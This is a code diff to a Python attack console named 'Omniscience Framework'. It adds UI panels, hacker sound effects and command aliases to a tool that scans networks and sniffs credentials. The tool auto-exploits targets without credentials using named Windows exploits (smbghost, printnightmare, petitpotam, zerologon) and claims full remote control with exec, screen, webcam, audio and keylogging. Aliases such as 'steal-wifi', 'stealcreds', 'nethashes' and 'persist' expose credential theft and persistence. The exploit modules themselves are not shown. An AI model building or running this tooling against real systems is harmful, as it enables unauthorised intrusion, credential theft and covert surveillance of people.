+            current_line +=1
+            print(f"\033[{current_line};{start_x}H{Fore.CYAN}╚════════════════════════════════════════╝")
+            
+            # Reset cursor position
+            print(f"\033[{height-1};0H", end='', flush=True)
+            
+        except:
+            pass
 
     @staticmethod
     def display_screenshot(image_path):
@@ -726,6 +1083,16 @@ class OmniShell:
         self.targeting = set()
         self.interactive_events = []
         self._start_time = datetime.now()
+        
+        # Initialize advanced UI components
+        self.live_monitor = LiveMonitor()
+        self.visual_effects = AdvancedVisualEffects()
+        self.command_tree = CommandTree()
+        
+        # Store singleton instance for sidebar access
+        OmniShell._instance = self
+        self.panel_active = True
+        self.selected_interface = 0
 
         print(f"\n  {Fore.CYAN}{Style.BRIGHT}◈  Initializing Omniscience Framework v5.1 ...")
         print(f"  {Fore.BLUE}{'─'*60}")
@@ -967,6 +1334,134 @@ class OmniShell:
         
         return True, ""
     
+    def _display_right_panel(self):
+        """Display permanent right side status panel with full network info"""
+        try:
+            import socket, ipaddress
+            width = os.get_terminal_size().columns
+            panel_x = max(width - 42, 2)
+            line = 2
+            
+            # Clear panel area first
+            for clear_line in range(2, 45):
+                print(f"\033[{clear_line};{panel_x}H{' ' * 41}")
+            
+            # Panel header - modern hacker style
+            print(f"\033[{line};{panel_x}H{Fore.CYAN}{Style.BRIGHT}╔═══════════════ NETWORK STATUS ═══════════════╗")
+            line += 1
+            print(f"\033[{line};{panel_x}H{Fore.CYAN}{Style.BRIGHT}║{Style.RESET_ALL}{Fore.GREEN}  {socket.gethostname():<37} {Fore.CYAN}║")
+            line += 1
+            print(f"\033[{line};{panel_x}H{Fore.CYAN}{Style.BRIGHT}╠══════════════════════════════════════════════╣")
+            line += 1
+            
+            # Get ALL network interfaces with full details using netifaces
+            interfaces = netifaces.interfaces()
+            iface_idx = 0
+            self.network_interfaces = []
+            
+            for iface in interfaces:
+                if iface.startswith(('lo', 'Loopback')): continue
+                
+                addrs = netifaces.ifaddresses(iface)
+                if not addrs: continue
+                
+                iface_data = {
+                    'name': iface,
+                    'index': iface_idx,
+                    'selected': False,
+                    'ipv4': [],
+                    'ipv6': [],
+                    'gateway': None,
+                    'mac': None
+                }
+                
+                # Get MAC address
+                if netifaces.AF_LINK in addrs:
+                    iface_data['mac'] = addrs[netifaces.AF_LINK][0].get('addr')
+                
+                # Get IPv4 addresses and netmasks
+                if netifaces.AF_INET in addrs:
+                    for addr_info in addrs[netifaces.AF_INET]:
+                        ip = addr_info.get('addr')
+                        if ip and not ip.startswith('127.'):
+                            netmask = addr_info.get('netmask', 'N/A')
+                            iface_data['ipv4'].append((ip, netmask))
+                            self.network_interfaces.append({**iface_data, 'ip': ip, 'netmask': netmask, 'type': 'IPv4'})
+                
+                # Get IPv6 addresses
+                if netifaces.AF_INET6 in addrs:
+                    for addr_info in addrs[netifaces.AF_INET6]:
+                        ip = addr_info.get('addr', '').split('%')[0]
+                        if ip and not ip.startswith('::1'):
+                            netmask = addr_info.get('netmask', 'N/A')
+                            iface_data['ipv6'].append((ip, netmask))
+                            self.network_interfaces.append({**iface_data, 'ip': ip, 'netmask': netmask, 'type': 'IPv6'})
+                
+                # Display interface header
+                if iface_data['ipv4'] or iface_data['ipv6']:
+                    # Interface name with selection indicator
+                    if hasattr(self, 'selected_interface') and self.selected_interface == iface_idx:
+                        select_mark = f"{Fore.LIGHTGREEN_EX}◀ SELECTED"
+                    else:
+                        select_mark = ""
+                    
+                    print(f"\033[{line};{panel_x}H{Fore.CYAN}{Style.BRIGHT}║{Style.RESET_ALL}{Fore.YELLOW}  [{iface_idx}] {iface:<26} {select_mark}{Fore.CYAN}║")
+                    line += 1
+                    
+                    # Display IPv4 addresses
+                    for ip, mask in iface_data['ipv4']:
+                        print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}{Fore.WHITE}    {Fore.LIGHTGREEN_EX}IPv4:{Fore.GREEN} {ip:<15} /{Fore.CYAN} {mask:<15} {Fore.CYAN}║")
+                        line += 1
+                    
+                    # Display IPv6 addresses (truncated for display)
+                    for ip, mask in iface_data['ipv6'][:2]:
+                        short_ip = ip[:22] + '..' if len(ip) > 24 else ip
+                        print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}{Fore.WHITE}    {Fore.LIGHTCYAN_EX}IPv6:{Fore.CYAN} {short_ip:<22} {Fore.CYAN}║")
+                        line += 1
+                    
+                    print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}  {Fore.LIGHTBLACK_EX}{'-' * 37} {Fore.CYAN}║")
+                    line += 1
+                    iface_idx += 1
+            
+            # Gateways section
+            print(f"\033[{line};{panel_x}H{Fore.CYAN}╠══════════════════════════════════════════════╣")
+            line += 1
+            gws = netifaces.gateways()
+            if 'default' in gws:
+                for proto, gw_info in gws['default'].items():
+                    gw_ip, gw_iface = gw_info
+                    proto_name = "IPv4" if proto == netifaces.AF_INET else "IPv6"
+                    print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}{Fore.MAGENTA}  GATEWAY {proto_name}: {Fore.LIGHTMAGENTA_EX}{gw_ip:<23} {Fore.CYAN}║")
+                    line += 1
+            
+                print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}    {status_mark} {ip:<29} {Fore.CYAN}║")
+                line += 1
+            
+            if len(self.hosts) > 5:
+                print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}    {Fore.LIGHTBLACK_EX}+ {len(self.hosts)-5} more hosts...{' ' * 17} {Fore.CYAN}║")
+                line += 1
+            
+            print(f"\033[{line};{panel_x}H{Fore.CYAN}╠══════════════════════════════════════════════╣")
+            line += 1
+            
+            # Selected target
+            print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}{Fore.MAGENTA}  SELECTED TARGET:{' ' * 24} {Fore.CYAN}║")
+            line += 1
+            if self.selected_target:
+                print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}    {Fore.LIGHTMAGENTA_EX}{self.selected_target:<29} {Fore.CYAN}║")
+            else:
+                print(f"\033[{line};{panel_x}H{Fore.CYAN}║{Style.RESET_ALL}    {Fore.LIGHTBLACK_EX}No target selected{' ' * 19} {Fore.CYAN}║")
+            line += 1
+            
+            print(f"\033[{line};{panel_x}H{Fore.CYAN}{Style.BRIGHT}╚══════════════════════════════════════════════╝")
+            
+            # Reset cursor to safe position
+            print("\033[999;0H")
+            sys.stdout.flush()
+            
+        except Exception as e:
+            pass
+
     def run(self):
         """Main interactive shell loop - Hacker Mode"""
         # Play hacker startup sound
@@ -990,12 +1485,7 @@ class OmniShell:
         # Play banner
         Visualizer.banner()
         
-        self.running = True
-        self.command_history = []
-        
-        print(f"\n  {Fore.GREEN}{Style.BRIGHT}● Omniscience Framework READY  │  Type 'help' for commands\n")
-        
-         # Start background right panel refresh thread
+        # Start background right panel refresh thread
         def panel_refresh():
             while self.running:
                 try:
@@ -1005,6 +1495,11 @@ class OmniShell:
                     pass
         refresh_thread = threading.Thread(target=panel_refresh, daemon=True)
         refresh_thread.start()
+        
+        self.running = True
+        self.command_history = []
+        
+        print(f"\n  {Fore.GREEN}{Style.BRIGHT}● Omniscience Framework READY  │  Type 'help' for commands\n")
         
         # Main interactive loop
         while self.running:
@@ -1023,7 +1518,7 @@ class OmniShell:
                 
                 # Typing sound effect
                 try:
-                    winsound.Beep(random.randint(200, 600), 15)
+                    HackerSounds.command_exec()
                 except:
                     pass
                 
@@ -1031,8 +1526,11 @@ class OmniShell:
                 
             except KeyboardInterrupt:
                 print(f"\n  {Fore.YELLOW}{Style.BRIGHT}⚠  Ctrl+C  │  Type 'exit' to quit gracefully")
+                HackerSounds.warning()
             except Exception as e:
-                print(f"{Fore.RED}Error: {e}")
+                HackerSounds.command_error()
+                print(f"\n{Fore.RED}✘ COMMAND ERROR: {str(e)}{Style.RESET_ALL}")
+                logger.error(f"Command failed: {cmd_line} | Error: {e}")
     
     def process_command(self, cmd_line):
         """Processes a single command string. Redirects all prints to self._log."""
@@ -1044,30 +1542,96 @@ class OmniShell:
         cmd = parts[0].lower()
         args = parts[1:]
         
-        # Validate command before execution
+        # Command aliases
+        aliases = {
+            'q': 'quit', 'x': 'exit', 'e': 'exit',
+            'l': 'clear', 'cls': 'clear',
+            'ls': 'targets', 'll': 'targets',
+            'h': 'help', '?': 'help',
+            'i': 'info', 'sys': 'systeminfo',
+            'run': 'exec', 'cmd': 'exec',
+            'del': 'delete', 'rm': 'file delete',
+            'cp': 'file upload', 'mv': 'file',
+            'cat': 'file list', 'dir': 'file list',
+            'netstat': 'network', 'ifconfig': 'interfaces',
+            'whoami': 'sysinfo',
+            'start': 'exec', 'stop': 'killproc',
+            'restart': 'reboot',
+            'on': 'persist', 'off': 'persist',
+            'up': 'upload', 'down': 'download',
+            'wifi': 'steal-wifi', 'wifipass': 'steal-wifi',
+            'creds': 'stealcreds', 'hash': 'nethashes',
+            'shell': 'exec',
+            'ping': 'icmp', 'arp': 'arp',
+            'scan': 'auto', 's': 'scan',
+            'show': 'targets', 'list': 'targets',
+            'connect': 'select', 'disconnect': 'target',
+            'c': 'clear', 'cc': 'clear',
+        }
+        
+        # Expand alias
+        if cmd in aliases:
+            cmd = aliases[cmd]
+            # Reconstruct cmd_line with expanded command
+            cmd_line = cmd + ' ' + ' '.join(args)
+        
+         # Validate command before execution
         valid, error = self._validate_command(cmd, args)
         if not valid:
+            HackerSounds.command_error()
             self._log(f"{Fore.RED}⚠ {error}")
             return
         
         try:
+            # Play command execution sound
+            HackerSounds.command_exec()
+            
             # ==================== HELP ====================
             if cmd in ("help", "?"):
                 self.print_help()
+                HackerSounds.command_success()
+            
+            elif cmd == "tree":
+                self.command_tree.print_tree()
+                HackerSounds.command_success()
+            
+            elif cmd == "commands":
+                self._log(f"\n{Fore.CYAN}{Style.BRIGHT}Available command categories:")
+                for category in self.command_tree.commands.keys():
+                    self._log(f"  {Fore.GREEN}▸ {category}")
+                self._log(f"\n{Fore.YELLOW}Use 'tree' to see full command hierarchy")
+                self._log(f"{Fore.YELLOW}Use 'help <category>' for category-specific help\n")
+                HackerSounds.command_success()
             
             # ==================== SYSTEM ====================
             elif cmd in ("exit", "quit"):
                 self._log(f"{Fore.YELLOW}[*] Exiting...")
+                HackerSounds.warning()
                 self.running = False
 
             elif cmd == "clear":
                 os.system('cls' if os.name == 'nt' else 'clear')
                 Visualizer.banner()
+                HackerSounds.command_success()
 
             elif cmd == "history":
                 print(f"\n{Fore.CYAN}Command History:")
                 for i, c in enumerate(self.command_history):
                     print(f"  {i}: {c}")
+                HackerSounds.command_success()
+
+            elif cmd in ("sound", "sounds", "mute", "unmute", "audio"):
+                if cmd in ("mute", "off"):
+                    HackerSounds.toggle_sound(False)
+                    print(f"{Fore.RED}Sound muted")
+                elif cmd in ("unmute", "on"):
+                    HackerSounds.toggle_sound(True)
+                    print(f"{Fore.GREEN}Sound enabled")
+                else:
+                    state = "ON" if HackerSounds._enabled else "OFF"
+                    print(f"{Fore.CYAN}Sound: {Fore.GREEN}{state}")
+                    # Play test sound
+                    HackerSounds.success()
 
             elif cmd == "setcreds" and len(args) >= 2:
                 self.credentials["user"], self.credentials["pass"] = args[0], args[1]
@@ -1094,17 +1658,22 @@ class OmniShell:
                         
                         # AUTO-EXPLOIT AND CONNECT AUTOMATICALLY - FULL POWER
                         HackerSounds.target_acquired()
+                        HackerSounds.scan_beep()
                         
                         success = False
                         exploits_used = []
                         
                         # First use universal engine for unauthenticated access
                         if self.universal:
-                            res = self.universal.pwn_target(self.selected_target)
-                            if res.get('success', False):
-                                success = True
-                                exploits_used = res.get('vulns', [])
-                                print(f"{Fore.LIGHTGREEN_EX}  ✅ UNIVERSAL ACCESS - NO CREDENTIALS REQUIRED")
+                            try:
+                                res = self.universal.pwn_target(self.selected_target)
+                                if res.get('success', False):
+                                    success = True
+                                    exploits_used = res.get('vulns', [])
+                                    print(f"{Fore.LIGHTGREEN_EX}  ✅ UNIVERSAL ACCESS - NO CREDENTIALS REQUIRED")
+                                    HackerSounds.exploit_success()
+                            except Exception as e:
+                                logger.debug(f"Universal exploit failed: {e}")
                         
                         # If universal failed, use control engine exploit chains
                         if not success and self.control:
@@ -1115,6 +1684,7 @@ class OmniShell:
                             for exploit in exploit_methods:
                                 try:
                                     if hasattr(self.control, exploit):
+                                        HackerSounds.beep_hack(700 + len(exploits_used)*100, 20)
                                         res = getattr(self.control, exploit)(
                                             self.selected_target, 
                                             self.credentials["user"], 
@@ -1124,18 +1694,23 @@ class OmniShell:
                                             success = True
                                             exploits_used.append(exploit)
                                             print(f"{Fore.LIGHTGREEN_EX}  ✅ {exploit.upper()} SUCCESS")
-                                except:
+                                            HackerSounds.exploit_success()
+                                            break
+                                except Exception as e:
+                                    logger.debug(f"{exploit} failed: {e}")
                                     continue
                         
                         self.targeting.discard(self.selected_target)
                         if success:
                             self.compromised.add(self.selected_target)
                             HackerSounds.access_granted()
+                            HackerSounds.success()
                             print(f"{Fore.LIGHTGREEN_EX}  ✅ FULL REMOTE CONTROL ESTABLISHED")
                             print(f"{Fore.LIGHTGREEN_EX}  ✅ Vulnerabilities: {', '.join(exploits_used)}")
                             print(f"{Fore.LIGHTGREEN_EX}  ✅ All features active: exec, screen, webcam, audio, keylog")
                             print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
                         else:
+                            HackerSounds.beep_hack(300, 100)
                             print(f"{Fore.YELLOW}  ⚠ Target discovered. Default credentials may work.")
                             print(f"{Fore.YELLOW}  Use 'setcreds' to set credentials, or try:")
                             print(f"{Fore.YELLOW}    smbghost, printnightmare, petitpotam, zerologon")
@@ -1160,64 +1735,8 @@ class OmniShell:
             elif cmd in ("dashboard", "status"):
                 self._print_dashboard()
 
-        except Exception as e:
-            self._log(f"{Fore.RED}Error: {e}")
-
-    def _show_hosts_table(self):
-        if not self.hosts:
-            self._log("No hosts discovered.")
-            return
-        headers = ["ID", "IP Address", "Status"]
-        rows = []
-        for i, host in enumerate(self.hosts):
-            ip = host if isinstance(host, str) else (host.get('ip') if isinstance(host, dict) else getattr(host, 'ip', str(host)))
-            status = "Discovered"
-            rows.append([str(i), ip, status])
-        Visualizer.table(headers, rows, "Discovered Hosts")
-
-    def _display_right_panel(self):
-        if not self.hosts:
-            return
-        try:
-            width = os.get_terminal_size().columns
-            height = os.get_terminal_size().lines
-            right_col = width - 35  # Wider panel for more info
-            start_row = 4
-            # Clear right panel first
-            for i in range(height-5):
-                print(f"\033[{start_row+i};{right_col}H{' '*30}")
-            print(f"\033[{start_row};{right_col}H{Fore.CYAN}{Style.BRIGHT}═══ OMNISCIENCE TARGETS ═══")
-            for i, host in enumerate(self.hosts[:height-10]):
-                ip = host if isinstance(host, str) else (host.get('ip') if isinstance(host, dict) else getattr(host, 'ip', str(host)))
-                status = "DISCOVERED"
-                color = Fore.GREEN
-                if hasattr(self, 'compromised') and ip in self.compromised:
-                    status = "✅ COMPROMISED"
-                    color = Fore.LIGHTGREEN_EX
-                elif hasattr(self, 'targeting') and ip in self.targeting:
-                    status = "⟳ SCANNING"
-                    color = Fore.YELLOW
-                print(f"\033[{start_row+1+i};{right_col}H{color}{i:2}: {ip:<15} {status}")
-            print(f"\033[{start_row+len(self.hosts[:height-10])+1};{right_col}H{Fore.YELLOW}──────────────────────────")
-            print(f"\033[{start_row+len(self.hosts[:height-10])+2};{right_col}H{Fore.WHITE}select <id>  → Auto-attack")
-            print(f"\033[{start_row+len(self.hosts[:height-10])+3};{right_col}H{Fore.WHITE}pwn <ip>     → Direct exploit")
-            print(f"\033[{start_row+len(self.hosts[:height-10])+4};{right_col}H{Fore.WHITE}targets      → Full list")
-        except:
-            pass
-
-    def _print_dashboard(self):
-        self._log(f"\n{Fore.CYAN}{Style.BRIGHT}╔════════════════════════════════════════════════════════════╗")
-        self._log(f"{Fore.CYAN}{Style.BRIGHT}║                  OMNISCIENCE SYSTEM DASHBOARD                 ║")
-        self._log(f"{Fore.CYAN}{Style.BRIGHT}╠════════════════════════════════════════════════════════════╣")
-        self._log(f"{Fore.LIGHTGREEN_EX}  Hosts Discovered: {len(self.hosts)}")
-        self._log(f"{Fore.LIGHTGREEN_EX}  Selected Target: {self.selected_target or 'None'}")
-        self._log(f"{Fore.LIGHTGREEN_EX}  Credentials: {self.credentials['user']} / {'*' * len(self.credentials['pass'])}")
-        self._log(f"{Fore.LIGHTGREEN_EX}  Active Modules: {sum(1 for x in [self.discovery, self.intel, self.control, self.adv_scan, self.center, self.universal] if x)}/6")
-        self._log(f"{Fore.LIGHTGREEN_EX}  Session Uptime: {str(datetime.now() - self._start_time).split('.')[0]}")
-        self._log(f"{Fore.CYAN}{Style.BRIGHT}╚════════════════════════════════════════════════════════════╝\n")
-
-        # ==================== DISCOVERY COMMANDS ====================
-        if cmd == "auto":
+            # ==================== DISCOVERY COMMANDS ====================
+            elif cmd == "auto":
                 print(f"[*] OMNISCIENCE FULL NETWORK SCAN INITIATED")
                 print(f"{Fore.GREEN}[*] ARP, ICMP, TCP, NetBIOS, mDNS, SSDP, SNMP active probes")
                 HackerSounds.scan_beep()
@@ -1249,914 +1768,827 @@ class OmniShell:
                         print(f"\n{Fore.GREEN}[+] AUTO-EXPLOIT COMPLETE: {compromised}/{len(self.hosts)} COMPROMISED")
                     HackerSounds.success()
 
-                elif cmd == "fastscan":
-                    print(f"[*] FAST 10-SEC NETWORK SWEEP INITIATED")
-                    HackerSounds.network_pulse()
-                    if self.discovery:
-                        self.hosts = self.discovery.fast_sweep()
-                        print(f"\n{Fore.GREEN}[+] FAST SCAN COMPLETE - {len(self.hosts)} HOSTS DETECTED")
-                        self._show_hosts_table()
-                        self._display_right_panel()
-                    HackerSounds.success()
+            elif cmd == "fastscan":
+                print(f"[*] FAST 10-SEC NETWORK SWEEP INITIATED")
+                HackerSounds.network_pulse()
+                if self.discovery:
+                    self.hosts = self.discovery.fast_sweep()
+                    print(f"\n{Fore.GREEN}[+] FAST SCAN COMPLETE - {len(self.hosts)} HOSTS DETECTED")
+                    self._show_hosts_table()
+                    self._display_right_panel()
+                HackerSounds.success()
 
-                elif cmd == "scan" and args:
-                    if self.discovery:
-                        self.hosts = self.discovery.full_scan(args[0]) if hasattr(self.discovery, 'full_scan') else []
-                        self._show_hosts_table()
+            elif cmd == "scan" and args:
+                if self.discovery:
+                    self.hosts = self.discovery.full_scan(args[0]) if hasattr(self.discovery, 'full_scan') else []
+                    self._show_hosts_table()
 
-                elif cmd == "arp":
-                    if not args and self.discovery:
-                        hosts = self.discovery.arp_scan(self.discovery.get_current_subnet())
-                        print(f"[+] Found {len(hosts)} hosts via ARP")
-                    elif args and self.discovery:
-                        hosts = self.discovery.arp_scan(args[0])
-                        print(f"[+] Found {len(hosts)} hosts")
+            elif cmd == "arp":
+                if not args and self.discovery:
+                    hosts = self.discovery.arp_scan(self.discovery.get_current_subnet())
+                    print(f"[+] Found {len(hosts)} hosts via ARP")
+                elif args and self.discovery:
+                    hosts = self.discovery.arp_scan(args[0])
+                    print(f"[+] Found {len(hosts)} hosts")
 
-                elif cmd == "icmp":
-                    if not args and self.discovery:
-                        hosts = self.discovery.icmp_sweep(self.discovery.get_current_subnet())
-                        print(f"[+] Found {len(hosts)} hosts")
-                    elif args and self.discovery:
-                        hosts = self.discovery.icmp_sweep(args[0])
-                        print(f"[+] Found {len(hosts)} hosts")
+            elif cmd == "icmp":
+                if not args and self.discovery:
+                    hosts = self.discovery.icmp_sweep(self.discovery.get_current_subnet())
+                    print(f"[+] Found {len(hosts)} hosts")
+                elif args and self.discovery:
+                    hosts = self.discovery.icmp_sweep(args[0])
+                    print(f"[+] Found {len(hosts)} hosts")
 
-                elif cmd == "netbios":
-                    if args and self.discovery:
-                        info = self.discovery.netbios_scan(args[0]) if hasattr(self.discovery, 'netbios_scan') else {}
-                        print(f"[+] {json.dumps(info, indent=2)}")
+            elif cmd == "netbios":
+                if args and self.discovery:
+                    info = self.discovery.netbios_scan(args[0]) if hasattr(self.discovery, 'netbios_scan') else {}
+                    print(f"[+] {json.dumps(info, indent=2)}")
 
-                elif cmd == "snmp":
-                    if args and self.discovery:
-                        info = self.discovery.snmp_query(args[0]) if hasattr(self.discovery, 'snmp_query') else {}
-                        print(f"[+] {json.dumps(info, indent=2)}")
+            elif cmd == "snmp":
+                if args and self.discovery:
+                    info = self.discovery.snmp_query(args[0]) if hasattr(self.discovery, 'snmp_query') else {}
+                    print(f"[+] {json.dumps(info, indent=2)}")
 
-                elif cmd == "mdns":
-                    if self.discovery:
-                        devices = self.discovery.mdns_listen() if hasattr(self.discovery, 'mdns_listen') else []
-                        print(f"[+] Found {len(devices)} mDNS devices")
+            elif cmd == "mdns":
+                if self.discovery:
+                    devices = self.discovery.mdns_listen() if hasattr(self.discovery, 'mdns_listen') else []
+                    print(f"[+] Found {len(devices)} mDNS devices")
 
-                elif cmd == "ssdp":
-                    if self.discovery:
-                        devices = self.discovery.ssdp_discover() if hasattr(self.discovery, 'ssdp_discover') else []
-                        print(f"[+] Found {len(devices)} UPnP devices")
+            elif cmd == "ssdp":
+                if self.discovery:
+                    devices = self.discovery.ssdp_discover() if hasattr(self.discovery, 'ssdp_discover') else []
+                    print(f"[+] Found {len(devices)} UPnP devices")
 
-                elif cmd == "http":
-                    if args and self.discovery:
-                        info = self.discovery.http_fingerprint(args[0]) if hasattr(self.discovery, 'http_fingerprint') else {}
-                        print(f"[+] {json.dumps(info, indent=2)}")
+            elif cmd == "http":
+                if args and self.discovery:
+                    info = self.discovery.http_fingerprint(args[0]) if hasattr(self.discovery, 'http_fingerprint') else {}
+                    print(f"[+] {json.dumps(info, indent=2)}")
 
-                elif cmd == "traceroute":
-                    if args and self.adv_scan:
-                        hops = self.adv_scan.traceroute(args[0]) if hasattr(self.adv_scan, 'traceroute') else []
-                        print(f"[+] {len(hops)} hops to {args[0]}")
+            elif cmd == "traceroute":
+                if args and self.adv_scan:
+                    hops = self.adv_scan.traceroute(args[0]) if hasattr(self.adv_scan, 'traceroute') else []
+                    print(f"[+] {len(hops)} hops to {args[0]}")
                     for i, hop in enumerate(hops):
                         print(f"  {i+1}: {hop.get('ip', '*')} {hop.get('latency', '')}ms")
+                else:
+                    print(f"{Fore.RED}[!] traceroute requires a target IP and advanced scanner module.")
 
-                elif cmd == "topology":
-                    if self.adv_scan:
-                        topo = self.adv_scan.get_topology_map() if hasattr(self.adv_scan, 'get_topology_map') else {}
-                        print(f"{json.dumps(topo, indent=2)}")
+            elif cmd == "topology":
+                if self.adv_scan:
+                    topo = self.adv_scan.get_topology_map() if hasattr(self.adv_scan, 'get_topology_map') else {}
+                    print(f"{json.dumps(topo, indent=2)}")
 
-                elif cmd == "network":
-                    if self.discovery:
-                        info = self.discovery.get_network_info() if hasattr(self.discovery, 'get_network_info') else {}
-                        print(f"{json.dumps(info, indent=2)}")
+            elif cmd == "network":
+                if self.discovery:
+                    info = self.discovery.get_network_info() if hasattr(self.discovery, 'get_network_info') else {}
+                    print(f"{json.dumps(info, indent=2)}")
 
-                elif cmd == "interfaces":
-                    if self.discovery:
-                        info = self.discovery.get_interface_info() if hasattr(self.discovery, 'get_interface_info') else {}
-                        print(f"{json.dumps(info, indent=2)}")
+            elif cmd == "interfaces":
+                if self.discovery:
+                    info = self.discovery.get_interface_info() if hasattr(self.discovery, 'get_interface_info') else {}
+                    print(f"{json.dumps(info, indent=2)}")
 
-                elif cmd == "gateway":
-                    if self.discovery:
-                        gw = self.discovery.get_gateway_ip() if hasattr(self.discovery, 'get_gateway_ip') else 'N/A'
-                        print(f"Gateway: {gw}")
+            elif cmd == "gateway":
+                if self.discovery:
+                    gw = self.discovery.get_gateway_ip() if hasattr(self.discovery, 'get_gateway_ip') else 'N/A'
+                    print(f"Gateway: {gw}")
 
-                elif cmd == "external-ip":
-                    if self.discovery:
-                        ext = self.discovery._detect_external_info() if hasattr(self.discovery, '_detect_external_info') else {}
-                        print(f"External IP: {ext.get('external_ip', 'N/A')}")
+            elif cmd == "external-ip":
+                if self.discovery:
+                    ext = self.discovery._detect_external_info() if hasattr(self.discovery, '_detect_external_info') else {}
+                    print(f"External IP: {ext.get('external_ip', 'N/A')}")
 
-                elif cmd == "cloud-scan":
-                    provider = args[0] if args else 'aws'
-                    if self.adv_scan:
-                        devices = self.adv_scan.scan_public_ranges(provider) if hasattr(self.adv_scan, 'scan_public_ranges') else []
-                        print(f"[+] Found {len(devices)} devices in {provider} ranges")
+            elif cmd == "cloud-scan":
+                provider = args[0] if args else 'aws'
+                if self.adv_scan:
+                    devices = self.adv_scan.scan_public_ranges(provider) if hasattr(self.adv_scan, 'scan_public_ranges') else []
+                    print(f"[+] Found {len(devices)} devices in {provider} ranges")
 
-                elif cmd == "scan" and args:
-                    if self.discovery:
-                        self.hosts = self.discovery.full_scan(args[0]) if hasattr(self.discovery, 'full_scan') else []
-                        self._show_hosts_table()
+            # ==================== INTELLIGENCE ====================
+            elif cmd == "sniff":
+                if self.intel:
+                    iface = args[0] if args else None
+                    self.intel.start_sniffing(iface=iface)
+                    print(f"[+] Sniffer active")
 
-                elif cmd == "arp" and args:
-                    if self.discovery:
-                        hosts = self.discovery.arp_scan(args[0]) if hasattr(self.discovery, 'arp_scan') else []
-                        print(f"[+] Found {len(hosts)} hosts")
+            elif cmd == "stopsniff":
+                if self.intel:
+                    self.intel.stop_sniffing()
+                    print(f"[*] Sniffer stopped")
 
-                elif cmd == "icmp" and args:
-                    if self.discovery:
-                        hosts = self.discovery.icmp_sweep(args[0]) if hasattr(self.discovery, 'icmp_sweep') else []
-                        print(f"[+] Found {len(hosts)} hosts")
+            elif cmd == "creds":
+                if self.intel:
+                    creds = self.intel.get_credentials() if hasattr(self.intel, 'get_credentials') else []
+                    Visualizer.table(["TIME", "SOURCE", "DATA"], 
+                        [[c.get('time','?'), c.get('src','?'), str(c.get('data','?'))[:40]] for c in creds[:20]],
+                        "CREDENTIALS")
 
-                elif cmd == "netbios" and args:
-                    if self.discovery:
-                        info = self.discovery.netbios_scan(args[0]) if hasattr(self.discovery, 'netbios_scan') else {}
-                        print(f"[+] {json.dumps(info, indent=2)}")
+            elif cmd == "dns-log":
+                if self.intel:
+                    logs = self.intel.get_dns_log() if hasattr(self.intel, 'get_dns_log') else []
+                    Visualizer.table(["TIME", "QUERY"], [[l.get('time','?'), l.get('query','?')] for l in logs[:20]], "DNS")
 
-                elif cmd == "mdns":
-                    if self.discovery:
-                        devices = self.discovery.mdns_listen() if hasattr(self.discovery, 'mdns_listen') else []
-                        print(f"[+] Found {len(devices)} devices")
+            elif cmd == "monitor":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                if self.intel:
+                    self.intel.wmi_monitor_activity(target, self.credentials["user"], self.credentials["pass"])
+                    print(f"[+] Monitoring {target}")
 
-                elif cmd == "ssdp":
-                    if self.discovery:
-                        devices = self.discovery.ssdp_discover() if hasattr(self.discovery, 'ssdp_discover') else []
-                        print(f"[+] Found {len(devices)} UPnP devices")
+            elif cmd == "wmi-proc":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                if self.intel and hasattr(self.intel, 'wmi_processes'):
+                    procs = self.intel.wmi_processes(target, self.credentials["user"], self.credentials["pass"])
+                    Visualizer.table(["PID", "NAME"], [[p.get('ProcessId','?'), p.get('Name','?')] for p in procs[:20]], "PROCESSES")
 
-                elif cmd == "snmp" and args:
-                    if self.discovery:
-                        info = self.discovery.snmp_query(args[0]) if hasattr(self.discovery, 'snmp_query') else {}
-                        print(f"[+] {json.dumps(info, indent=2)}")
+            elif cmd == "wmi-users":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                if self.intel and hasattr(self.intel, 'wmi_logged_users'):
+                    users = self.intel.wmi_logged_users(target, self.credentials["user"], self.credentials["pass"])
+                    print(f"{json.dumps(users, indent=2)}")
 
-                elif cmd == "http" and args:
-                    if self.discovery:
-                        info = self.discovery.http_fingerprint(args[0]) if hasattr(self.discovery, 'http_fingerprint') else {}
-                        print(f"[+] {json.dumps(info, indent=2)}")
-
-                elif cmd == "traceroute" and args:
-                    if self.adv_scan:
-                        hops = self.adv_scan.traceroute(args[0]) if hasattr(self.adv_scan, 'traceroute') else []
-                        print(f"[+] {len(hops)} hops to {args[0]}")
-
-                elif cmd == "topology":
-                    if self.adv_scan:
-                        topo = self.adv_scan.get_topology_map() if hasattr(self.adv_scan, 'get_topology_map') else {}
-                        print(f"{json.dumps(topo, indent=2)}")
-
-                elif cmd == "network":
-                    if self.discovery:
-                        info = self.discovery.get_network_info() if hasattr(self.discovery, 'get_network_info') else {}
-                        print(f"{json.dumps(info, indent=2)}")
-
-                elif cmd == "interfaces":
-                    if self.discovery:
-                        info = self.discovery.get_interface_info() if hasattr(self.discovery, 'get_interface_info') else {}
-                        print(f"{json.dumps(info, indent=2)}")
-
-                elif cmd == "gateway":
-                    if self.discovery:
-                        gw = self.discovery.get_gateway_ip() if hasattr(self.discovery, 'get_gateway_ip') else 'N/A'
-                        print(f"Gateway: {gw}")
-
-                elif cmd == "external-ip":
-                    if self.discovery:
-                        ext = self.discovery._detect_external_info() if hasattr(self.discovery, '_detect_external_info') else {}
-                        print(f"External IP: {ext.get('external_ip', 'N/A')}")
-
-                elif cmd == "setdomain":
-                    if args:
-                        self.credentials["domain"] = args[0]
-                        print(f"[+] Domain set to: {args[0]}")
-                    else:
-                        print(f"Current domain: {self.credentials['domain'] or 'NONE'}")
-
-                elif cmd == "processes":
-                    target = args[0] if args else self.selected_target
-                    if not target:
